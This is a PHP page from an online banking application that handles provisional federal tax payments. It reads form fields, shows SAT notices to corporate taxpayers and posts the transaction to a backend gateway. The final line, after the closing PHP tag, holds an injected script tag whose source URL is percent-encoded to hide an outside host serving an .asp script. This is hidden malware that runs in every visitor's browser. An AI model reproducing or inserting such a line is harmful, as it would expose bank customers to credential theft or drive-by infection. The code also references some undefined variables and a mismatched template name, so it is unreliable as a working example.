<?php
//
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "pagoimpuestos.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "pagoimpuestos_tpl" => "pagoimpuestos.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
    
//HB
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];	
	
	if(!empty($_POST['code']))
		$code = $_POST['code'];
		
	if(!empty($_POST['FrAccount']))
		$FrAccount = $_POST['FrAccount'];
		
	if(!empty($_POST['ImpTipo']))
		$ImpTipo = $_POST['ImpTipo'];
		
	if(!empty($_POST['Year']))
		$Year = $_POST['Year'];
		
	if(!empty($_POST['Month']))
		$Month = $_POST['Month'];
		
	if(!empty($_POST['Amount']))
		$Amount = $_POST['Amount'];
		
	if(!empty($_POST['RFC']))
		$RFC = $_POST['RFC'];
		
	if(!empty($_POST['ImpEnvio']))
		$ImpEnvio = $_POST['ImpEnvio'];
		
	if(!empty($_POST['Day']))
		$Day = $_POST['Day'];
		
//HB    
    
    //Ini emedrano 25Jul2012 validación de personas morales   
    $mensaje_sat = "";
    $fecActual= date( "Y" ).date( "m" ). date( "d" );
    $perfil = $session->variable( "r_perfil" );
    $noPagProv=0;
    $rfcMoralesIVal=0;
    $fechaLimite='20121008';
    $rfcMoralesI= substr ( $DatosImp,7,1 );	    
	    	
    if(($rfcMoralesI=='0' or $rfcMoralesI=='1' or $rfcMoralesI=='2' or $rfcMoralesI=='3' or $rfcMoralesI=='4' or $rfcMoralesI=='5' or $rfcMoralesI=='6' or $rfcMoralesI=='7' or $rfcMoralesI=='8' or $rfcMoralesI=='9')and $rfcMoralesI!=null)
    {	    
	$rfcMoralesIVal = 1;	    
    }
    if((($perfil=='permor') or ($rfcMoralesIVal != 0)) and ($fecActual >= $fechaLimite))
    {		
	if($rfcMoralesIVal != 0)
	{
		$mensaje_sat=	 "<table width='80%' height='62' border='1' align='center' cellpadding='5' cellspacing='0'><tr><td colspan='0' align='center'>Sr. Contribuyente, el SAT le informa:<br>A partir de febrero del 2012 est&aacute; obligado a utilizar el Servicio de Pago Referenciado para presentar sus pagos provisionales o definitivos de impuestos federales para Personas Morales, no debe de utilizar el esquema anterior de pagos electr&oacutenicos.</td></tr></table>";	
	}
	else
	{
		$mensaje_sat=	 "<table width='80%' height='62' border='1' align='center' cellpadding='5' cellspacing='0'><tr><td colspan='0' align='center'>Sr. Contribuyente, el SAT le informa:<br>A partir de febrero del 2012 est&aacute; obligado a utilizar el Servicio de Pago Referenciado para presentar sus pagos provisionales o definitivos de impuestos federales, no debe de utilizar el esquema anterior de pagos electr&oacutenicos.</td></tr></table>";	
	}
	$noPagProv=1;
    }
    elseif((($perfil=='permor') or ($rfcMoralesIVal != 0)) and ($fecActual < $fechaLimite))
    {
	$mensaje_sat=	 "<script>window.alert('Sr. Contribuyente, el SAT le informa: A partir de febrero 2012, todas las personas morales deben utilizar el Servicio de Pago Referenciado para presentar sus declaraciones provisionales y definitivas de impuestos federales, por lo cual pr\u00f3ximamente esta aplicaci\u00f3n dejar\u00e1 de funcionar. ');</script>";	
	$noPagProv=0;
    }else
    {
	$mensaje_sat=	 "";
	$noPagProv=0;
    }    
    if($noPagProv==0){
	//Fin emedrano 25Jul2012 validación de personas morales
    if(empty($Access)) {
        $Access = "FrAc";
    }
    switch($Access) {
    case "FrAc":
        $particularFields = "";
        $tr->blog($qki,"Impuestos Pagos Privisionales", $FrAccount, $ImpTipo, $Month, $Year, $Amount);
        break;
    case "Confirm":
    case "Process":
        $particularFields = "&Passwd=".encrypt( $code, strtolower( $usr ) )."&RFC=".urlencode($RFC)."&FrAccount=".urlencode($FrAccount)."&ImpTipo=".urlencode($ImpTipo)."&ImpEnvio=".urlencode($ImpEnvio)."&Day=".urlencode($Day)."&Month=".urlencode($Month)."&Year=".urlencode($Year)."&DayF=".urlencode($DayF)."&MonthF=".urlencode($MonthF)."&YearF=".urlencode($YearF)."&Amount=".urlencode($Amount);
        $tr->blog($qki,"Impuestos Pagos Provisionales", $FrAccount, $ImpTipo, $Month, $Year, $Amount);
        break;
    }
    $transaccion_buffer = "";
    // DebugBreak();
    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=imp&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // pago de impuestos

    }//Agrega emedrano 25Jul2012 validación de personas morales fin validacion
    //$t->set_var( "transaccion_buffer", $transaccion_buffer );
     $t->set_var( "transaccion_buffer", $mensaje_sat.$transaccion_buffer);
    $t->pparse( "output", "pagosprovisionales_tpl" );
}
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/pagosprovisionales/" );

    $t->pparse( "output", "user_login_tpl" );
}
?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>